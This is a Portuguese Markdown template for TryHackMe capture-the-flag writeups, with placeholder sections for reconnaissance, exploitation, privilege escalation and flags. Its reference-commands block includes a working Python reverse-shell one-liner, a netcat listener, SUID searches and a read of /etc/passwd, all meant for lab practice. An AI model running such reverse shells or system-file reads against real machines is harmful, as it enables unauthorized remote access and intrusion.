# 📝 Template de Writeup TryHackMe

## 📋 Informações da Sala

| Campo | Valor |
|-------|-------|
| **Nome da Sala** | [Nome da sala] |
| **URL** | [https://tryhackme.com/room/sala] |
| **Dificuldade** | 🟢 Easy / 🟡 Medium / 🔴 Hard |
| **Categoria** | [Linux/Windows/Network/SOC/etc] |
| **Tempo Estimado** | [XX minutos] |
| **Data de Conclusão** | [DD/MM/YYYY] |

## 🎯 Objetivos da Sala

- [ ] Objetivo 1
- [ ] Objetivo 2
- [ ] Objetivo 3

## 📚 Conhecimentos Necessários

### Pré-requisitos

- Conhecimento básico de [tecnologia]
- Familiaridade com [ferramenta]
- Conceitos de [área]

### Ferramentas Utilizadas

- `ferramenta1` - Descrição do uso
- `ferramenta2` - Descrição do uso
- `ferramenta3` - Descrição do uso

## 🔍 Reconhecimento

### Informações Iniciais

```bash
# Comandos de reconhecimento
nmap -sS -A target_ip
```

**Resultados:**

- Porta 22: SSH
- Porta 80: HTTP
- Porta 443: HTTPS

### Enumeração

```bash
# Comandos de enumeração
gobuster dir -u http://target_ip -w wordlist.txt
```

## 🚀 Exploração

### Vulnerabilidade Identificada

**CVE/Tipo:** [CVE-2023-XXXX ou tipo de vulnerabilidade]

**Descrição:** Breve descrição da vulnerabilidade encontrada.

### Exploit

```bash
# Comandos do exploit
exploit_command --target target_ip --payload payload
```

**Resultado:** Descrição do que aconteceu após a exploração.

## 🔐 Escalação de Privilégios

### Enumeração do Sistema

```bash
# Comandos para enumerar o sistema
id
sudo -l
find / -perm -4000 2>/dev/null
```

### Método de Escalação

**Técnica:** [Nome da técnica utilizada]

```bash
# Comandos para escalação
escalation_command
```

## 🏆 Flags Obtidas

### User Flag

- **Localização:** `/home/user/user.txt`
- **Flag:** `{user_flag_aqui}`

### Root Flag

- **Localização:** `/root/root.txt`
- **Flag:** `{root_flag_aqui}`

## 📝 Resumo da Solução

### Passos Principais

1. **Reconhecimento:** Descoberta de serviços na máquina alvo
2. **Enumeração:** Identificação de vulnerabilidades
3. **Exploração:** Obtenção de acesso inicial
4. **Escalação:** Elevação de privilégios para root
5. **Flags:** Coleta das flags user e root

### Lições Aprendidas

- Conceito importante 1
- Conceito importante 2
- Conceito importante 3

## 🔧 Comandos Úteis para Referência

```bash
# Reconhecimento
nmap -sS -sV -sC -A target_ip
masscan -p1-65535 target_ip --rate=1000

# Enumeração Web
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt
nikto -h http://target_ip

# Shells Reversos
nc -lvnp 4444
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Escalação Linux
find / -perm -4000 2>/dev/null
sudo -l
cat /etc/passwd
```

## 📚 Referências

- [Link para documentação oficial]
- [Tutorial relacionado]
- [CVE Database]
- [Exploit-DB]

## 🏷️ Tags

`linux` `privilege-escalation` `web` `enumeration` `[adicionar tags relevantes]`

---

**⭐ Dificuldade Pessoal:** [1-5 estrelas]  
**💡 Dica:** [Dica principal para quem for resolver]  
**📖 Área de Conhecimento:** [Linux/Windows/Network/SOC/Blue Team/etc]
